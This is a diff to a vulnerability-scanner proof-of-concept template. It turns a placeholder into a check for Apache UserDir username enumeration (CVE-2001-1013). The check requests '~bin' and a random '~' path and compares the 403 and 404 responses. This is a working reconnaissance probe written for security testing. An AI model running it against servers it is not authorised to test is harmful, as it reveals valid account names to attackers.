@@ -1,21 +1,47 @@
 [info]
-author = "ave"
-description = "AVE-2001-0357 verification"
+author = "AVE"
+description = "检测 Apache HTTP Server 是否启用了 UserDir 指令并存在远程用户名枚举漏洞。通过请求 ~username 路径，对比已知用户（如 bin）与随机字符串的 HTTP 响应状态码差异，判断服务器是否泄露有效用户名信息。"
 id = "POC-AVE-2001-0357"
-name = "PoC for AVE-2001-0357"
+name = "CVE-2001-1013 PoC"
 severity = "medium"
-tags = ["ave-2001-0357"]
-vuln_id = ["AVE-2001-0357"]
+tags = [
+    "cve-2001-1013",
+    "apache",
+    "userdir",
+    "user-enumeration",
+]
+vuln_id = [
+    "CVE-2001-1013",
+    "AVE-2001-0357",
+]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/vuln/path"
+path = "/{{BaseURL}}/~bin"
 protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
-status = [200]
-type = "status"
+part = "body"
+type = "word"
+words = [
+    "403",
+    "forbidden",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/~{{randstr}}"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "404",
+    "not found",
+]
